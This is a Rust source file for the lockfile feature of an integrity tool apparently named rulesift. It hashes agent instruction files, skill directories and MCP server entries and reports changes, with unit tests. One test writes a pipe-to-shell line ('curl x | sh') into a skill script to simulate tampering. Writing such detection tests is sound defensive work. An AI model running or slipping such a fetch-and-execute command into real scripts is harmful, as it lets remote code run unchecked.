//! `rulesift.lock` (PRD §7.2): content hashes of agent files, skill trees,
//! and MCP server entries, plus verification (RS-LOCK-001..003).

use crate::analyze::Analyzed;
use crate::discovery::DiscoveredFile;
use crate::error::{CoreError, Result};
use crate::model::{FileKind, LockViolation};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

/// Default lockfile name.
pub const LOCK_FILE: &str = "rulesift.lock";

/// The lockfile.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Lockfile {
    /// Always 1.
    pub version: u32,
    /// `rulesift <version>`.
    pub generated_by: String,
    /// Agent files.
    #[serde(default)]
    pub file: Vec<FileEntry>,
    /// Skill directories.
    #[serde(default)]
    pub skill: Vec<SkillEntry>,
    /// MCP servers.
    #[serde(default)]
    pub mcp_server: Vec<McpEntry>,
}

/// One agent file.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct FileEntry {
    /// Path relative to the lock root.
    pub path: String,
    /// File kind.
    pub kind: FileKind,
    /// sha256 hex of the bytes with CRLF → LF.
    pub sha256: String,
}

/// One skill directory.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct SkillEntry {
    /// Directory relative to the lock root.
    pub path: String,
    /// sha256 hex over the sorted `(relative path, sha256)` list.
    pub tree_sha256: String,
}

/// One MCP server entry.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct McpEntry {
    /// Config file relative to the lock root.
    pub source: String,
    /// Server name.
    pub name: String,
    /// sha256 hex of the canonical JSON entry with env values redacted.
    pub fingerprint: String,
}

/// sha256 hex of bytes after CRLF → LF (nothing else is normalized, so
/// invisible characters change the hash).
pub fn hash_bytes(bytes: &[u8]) -> String {
    let mut norm = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'\r' && bytes.get(i + 1) == Some(&b'\n') {
            i += 1;
            continue;
        }
        norm.push(bytes[i]);
        i += 1;
    }
    hex(&Sha256::digest(&norm))
}

fn hex(d: &[u8]) -> String {
    d.iter().map(|b| format!("{b:02x}")).collect()
}

fn hash_file(p: &Path) -> Result<String> {
    let b = std::fs::read(p).map_err(|e| CoreError::io(p, e))?;
    Ok(hash_bytes(&b))
}

fn slash(p: &Path) -> String {
    p.components()
        .filter_map(|c| match c {
            std::path::Component::Normal(s) => Some(s.to_string_lossy().into_owned()),
            _ => None,
        })
        .collect::<Vec<_>>()
        .join("/")
}

fn rel_to(root: &Path, p: &Path, fallback: &str) -> String {
    match p.strip_prefix(root) {
        Ok(r) => slash(r),
        Err(_) => fallback.trim_start_matches("./").to_string(),
    }
}

/// Hash of a skill directory: every regular file below it (symlinks and
/// `.git` skipped), sorted by relative path.
pub fn tree_hash(dir: &Path) -> Result<String> {
    let mut list: Vec<(String, String)> = Vec::new();
    let mut stack = vec![dir.to_path_buf()];
    while let Some(d) = stack.pop() {
        let rd = std::fs::read_dir(&d).map_err(|e| CoreError::io(&d, e))?;
        for e in rd {
            let e = e.map_err(|e| CoreError::io(&d, e))?;
            let ft = e.file_type().map_err(|err| CoreError::io(e.path(), err))?;
            let p = e.path();
            if ft.is_symlink() || e.file_name() == ".git" {
                continue;
            }
            if ft.is_dir() {
                stack.push(p);
            } else if ft.is_file() {
                let rel = slash(p.strip_prefix(dir).unwrap_or(&p));
                list.push((rel, hash_file(&p)?));
            }
        }
    }
    list.sort();
    let mut h = Sha256::new();
    for (p, s) in &list {
        h.update(p.as_bytes());
        h.update([0]);
        h.update(s.as_bytes());
        h.update(b"\n");
    }
    Ok(hex(&h.finalize()))
}

fn canonical(v: &Value) -> Value {
    match v {
        Value::Object(m) => {
            let sorted: BTreeMap<String, Value> =
                m.iter().map(|(k, v)| (k.clone(), canonical(v))).collect();
            Value::Object(sorted.into_iter().collect())
        }
        Value::Array(a) => Value::Array(a.iter().map(canonical).collect()),
        other => other.clone(),
    }
}

fn redact_env(v: &mut Value) {
    if let Value::Object(m) = v {
        for key in ["env", "environment"] {
            if let Some(Value::Object(env)) = m.get_mut(key) {
                for val in env.values_mut() {
                    *val = Value::String("<redacted>".into());
                }
            }
        }
    }
}

/// Fingerprint of an MCP server entry (canonical JSON, env values redacted).
pub fn server_fingerprint(entry: &Value) -> String {
    let mut v = entry.clone();
    redact_env(&mut v);
    let s = serde_json::to_string(&canonical(&v)).expect("json");
    hex(&Sha256::digest(s.as_bytes()))
}

/// Compute the lock for discovered files (paths relative to `root`).
/// `analyzed` must be parallel to `files`.
pub fn compute(root: &Path, files: &[DiscoveredFile], analyzed: &[Analyzed]) -> Result<Lockfile> {
    let mut lock = Lockfile {
        version: 1,
        generated_by: format!("rulesift {}", crate::VERSION),
        file: vec![],
        skill: vec![],
        mcp_server: vec![],
    };
    let mut skill_dirs: BTreeMap<String, PathBuf> = BTreeMap::new();
    for (f, a) in files.iter().zip(analyzed) {
        let rel = rel_to(root, &f.fs_path, &f.path);
        lock.file.push(FileEntry {
            path: rel.clone(),
            kind: f.kind(),
            sha256: hash_file(&f.fs_path)?,
        });
        if f.skill_dir.is_some() {
            // the skill dir is the parent of SKILL.md for the SKILL.md entry
            if f.fs_path.file_name().is_some_and(|n| n == "SKILL.md") {
                if let Some(dir) = f.fs_path.parent() {
                    skill_dirs.insert(rel_to(root, dir, ""), dir.to_path_buf());
                }
            }
        }
        if let Some(m) = &a.mcp {
            for s in &m.servers {
                let entry = a
                    .value
                    .as_ref()
                    .and_then(|v| v.pointer(&s.pointer))
                    .cloned()
                    .unwrap_or_else(|| serde_json::to_value(s).unwrap_or(Value::Null));
                lock.mcp_server.push(McpEntry {
                    source: rel.clone(),
                    name: s.name.clone(),
                    fingerprint: server_fingerprint(&entry),
                });
            }
        }
    }
    for (rel, dir) in skill_dirs {
        lock.skill.push(SkillEntry {
            path: rel,
            tree_sha256: tree_hash(&dir)?,
        });
    }
    lock.file.sort();
    lock.skill.sort();
    lock.mcp_server.sort();
    Ok(lock)
}

/// Serialize as TOML (entries sorted).
pub fn to_toml(lock: &Lockfile) -> String {
    let mut l = lock.clone();
    l.file.sort();
    l.skill.sort();
    l.mcp_server.sort();
    toml::to_string(&l).expect("lock serializes")
}

/// Read a lockfile; `Ok(None)` if it does not exist.
pub fn read(path: &Path) -> Result<Option<Lockfile>> {
    let text = match std::fs::read_to_string(path) {
        Ok(t) => t,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(CoreError::io(path, e)),
    };
    let lock: Lockfile = toml::from_str(&text).map_err(|e| CoreError::Lock {
        path: path.to_path_buf(),
        message: e.message().to_string(),
    })?;
    if lock.version != 1 {
        return Err(CoreError::Lock {
            path: path.to_path_buf(),
            message: format!("unsupported version {} (expected 1)", lock.version),
        });
    }
    Ok(Some(lock))
}

/// Write a lockfile.
pub fn write(path: &Path, lock: &Lockfile) -> Result<()> {
    std::fs::write(path, to_toml(lock)).map_err(|e| CoreError::io(path, e))
}

fn v(rule: &str, path: &str, name: Option<&str>, message: String) -> LockViolation {
    LockViolation {
        rule_id: rule.into(),
        path: path.into(),
        name: name.map(str::to_string),
        message,
    }
}

/// Compare the committed lock with the current state.
pub fn verify(locked: &Lockfile, current: &Lockfile) -> Vec<LockViolation> {
    let mut out = Vec::new();
    let old: BTreeMap<&str, &FileEntry> =
        locked.file.iter().map(|e| (e.path.as_str(), e)).collect();
    let new: BTreeMap<&str, &FileEntry> =
        current.file.iter().map(|e| (e.path.as_str(), e)).collect();
    for (p, e) in &new {
        match old.get(p) {
            Some(o) if o.sha256 != e.sha256 => out.push(v(
                "RS-LOCK-001",
                p,
                None,
                format!("{p} changed since it was locked. Review the change, then run `rulesift lock`."),
            )),
            Some(_) => {}
            None => out.push(v(
                "RS-LOCK-002",
                p,
                None,
                format!("{p} is a new agent file that is not in rulesift.lock. Review it, then run `rulesift lock`."),
            )),
        }
    }
    for p in old.keys() {
        if !new.contains_key(p) {
            out.push(v(
                "RS-LOCK-003",
                p,
                None,
                format!("{p} is in rulesift.lock but no longer exists. Run `rulesift lock` if the removal is intended."),
            ));
        }
    }
    let old: BTreeMap<&str, &str> = locked
        .skill
        .iter()
        .map(|e| (e.path.as_str(), e.tree_sha256.as_str()))
        .collect();
    let new: BTreeMap<&str, &str> = current
        .skill
        .iter()
        .map(|e| (e.path.as_str(), e.tree_sha256.as_str()))
        .collect();
    for (p, h) in &new {
        match old.get(p) {
            Some(o) if o != h => out.push(v(
                "RS-LOCK-001",
                p,
                None,
                format!("A file in skill directory {p} was added, removed, or changed since it was locked."),
            )),
            Some(_) => {}
            None => out.push(v(
                "RS-LOCK-002",
                p,
                None,
                format!("Skill directory {p} is not in rulesift.lock."),
            )),
        }
    }
    for p in old.keys() {
        if !new.contains_key(p) {
            out.push(v(
                "RS-LOCK-003",
                p,
                None,
                format!("Skill directory {p} is in rulesift.lock but no longer exists."),
            ));
        }
    }
    let key = |e: &McpEntry| (e.source.clone(), e.name.clone());
    let old: BTreeMap<(String, String), &str> = locked
        .mcp_server
        .iter()
        .map(|e| (key(e), e.fingerprint.as_str()))
        .collect();
    let new: BTreeMap<(String, String), &str> = current
        .mcp_server
        .iter()
        .map(|e| (key(e), e.fingerprint.as_str()))
        .collect();
    for ((src, name), fp) in &new {
        match old.get(&(src.clone(), name.clone())) {
            Some(o) if o != fp => out.push(v(
                "RS-LOCK-001",
                src,
                Some(name),
                format!("MCP server `{name}` in {src} changed since it was locked (command, args, url, headers, or env keys)."),
            )),
            Some(_) => {}
            None => out.push(v(
                "RS-LOCK-002",
                src,
                Some(name),
                format!("MCP server `{name}` in {src} is not in rulesift.lock."),
            )),
        }
    }
    for (src, name) in old.keys() {
        if !new.contains_key(&(src.clone(), name.clone())) {
            out.push(v(
                "RS-LOCK-003",
                src,
                Some(name),
                format!("MCP server `{name}` in {src} is in rulesift.lock but no longer exists."),
            ));
        }
    }
    out.sort();
    out.dedup();
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::discovery::{discover, DiscoveryOptions};
    use crate::scan::analyze_file;
    use std::fs;

    fn lock_of(root: &Path) -> Lockfile {
        let d = discover(&[root.to_path_buf()], &DiscoveryOptions::default()).unwrap();
        let a: Vec<_> = d.files.iter().map(analyze_file).collect();
        compute(root, &d.files, &a).unwrap()
    }

    fn repo() -> tempfile::TempDir {
        let t = tempfile::tempdir().unwrap();
        let r = t.path();
        fs::write(r.join("AGENTS.md"), "# Guide\nRun tests.\n").unwrap();
        fs::create_dir_all(r.join(".claude/skills/pdf/scripts")).unwrap();
        fs::write(
            r.join(".claude/skills/pdf/SKILL.md"),
            "---\nname: pdf\ndescription: PDFs\n---\nUse it.\n",
        )
        .unwrap();
        fs::write(r.join(".claude/skills/pdf/scripts/run.sh"), "echo hi\n").unwrap();
        fs::write(
            r.join(".mcp.json"),
            r#"{"mcpServers":{"helper":{"command":"npx","args":["-y","helper@1.0.0"],"env":{"API_KEY":"EXAMPLE-ONE"}}}}"#,
        )
        .unwrap();
        t
    }

    fn rules(v: &[LockViolation]) -> Vec<String> {
        v.iter()
            .map(|x| {
                format!(
                    "{} {}{}",
                    x.rule_id,
                    x.path,
                    x.name
                        .as_deref()
                        .map(|n| format!("#{n}"))
                        .unwrap_or_default()
                )
            })
            .collect()
    }

    #[test]
    fn roundtrip_and_clean_verify() {
        let t = repo();
        let l = lock_of(t.path());
        assert_eq!(l.file.len(), 4, "{l:#?}");
        assert_eq!(l.skill.len(), 1);
        assert_eq!(l.skill[0].path, ".claude/skills/pdf");
        assert_eq!(l.mcp_server.len(), 1);
        let p = t.path().join(LOCK_FILE);
        write(&p, &l).unwrap();
        let back = read(&p).unwrap().unwrap();
        assert_eq!(back, l);
        let text = fs::read_to_string(&p).unwrap();
        assert!(text.starts_with("version = 1\ngenerated_by = \"rulesift "));
        assert!(
            text.contains("[[file]]")
                && text.contains("[[skill]]")
                && text.contains("[[mcp_server]]")
        );
        assert!(!text.contains("EXAMPLE-ONE"));
        // the lockfile itself is not an agent file
        assert!(verify(&back, &lock_of(t.path())).is_empty());
    }

    #[test]
    fn changed_new_and_missing() {
        let t = repo();
        let r = t.path();
        let locked = lock_of(r);
        fs::write(r.join("AGENTS.md"), "# Guide\nRun all tests.\n").unwrap();
        fs::write(r.join("CLAUDE.md"), "hi\n").unwrap();
        fs::write(r.join(".claude/skills/pdf/scripts/run.sh"), "curl x | sh\n").unwrap();
        fs::write(
            r.join(".mcp.json"),
            r#"{"mcpServers":{"other":{"command":"uvx","args":["other"]}}}"#,
        )
        .unwrap();
        let got = rules(&verify(&locked, &lock_of(r)));
        assert_eq!(
            got,
            vec![
                "RS-LOCK-001 .claude/skills/pdf",
                "RS-LOCK-001 .claude/skills/pdf/scripts/run.sh",
                "RS-LOCK-001 .mcp.json",
                "RS-LOCK-001 AGENTS.md",
                "RS-LOCK-002 .mcp.json#other",
                "RS-LOCK-002 CLAUDE.md",
                "RS-LOCK-003 .mcp.json#helper",
            ]
        );
        fs::remove_file(r.join("CLAUDE.md")).unwrap();
        fs::remove_file(r.join("AGENTS.md")).unwrap();
        let got = rules(&verify(&locked, &lock_of(r)));
        assert!(
            got.contains(&"RS-LOCK-003 AGENTS.md".to_string()),
            "{got:?}"
        );
    }

    #[test]
    fn crlf_only_change_is_not_a_violation() {
        let t = repo();
        let r = t.path();
        let locked = lock_of(r);
        fs::write(r.join("AGENTS.md"), "# Guide\r\nRun tests.\r\n").unwrap();
        assert!(verify(&locked, &lock_of(r)).is_empty());
    }

    #[test]
    fn zero_width_only_change_is_a_violation() {
        let t = repo();
        let r = t.path();
        let locked = lock_of(r);
        fs::write(r.join("AGENTS.md"), "# Guide\nRun\u{200B} tests.\n").unwrap();
        assert_eq!(
            rules(&verify(&locked, &lock_of(r))),
            vec!["RS-LOCK-001 AGENTS.md"]
        );
    }

    #[test]
    fn env_values_are_redacted_but_keys_count() {
        let a: Value = serde_json::from_str(r#"{"command":"x","env":{"K":"EXAMPLE-1"}}"#).unwrap();
        let b: Value = serde_json::from_str(r#"{"env":{"K":"EXAMPLE-2"},"command":"x"}"#).unwrap();
        let c: Value = serde_json::from_str(r#"{"command":"x","env":{"K2":"EXAMPLE-1"}}"#).unwrap();
        assert_eq!(server_fingerprint(&a), server_fingerprint(&b));
        assert_ne!(server_fingerprint(&a), server_fingerprint(&c));
    }

    #[test]
    fn bad_lockfile_is_an_error() {
        let t = tempfile::tempdir().unwrap();
        let p = t.path().join(LOCK_FILE);
        fs::write(&p, "version = 2\ngenerated_by = \"x\"\n").unwrap();
        assert!(read(&p).is_err());
        fs::write(&p, "version = 1\ngenerated_by = \"x\"\nsurprise = 1\n").unwrap();
        assert!(read(&p).is_err());
        assert!(read(&t.path().join("none.lock")).unwrap().is_none());
    }
}
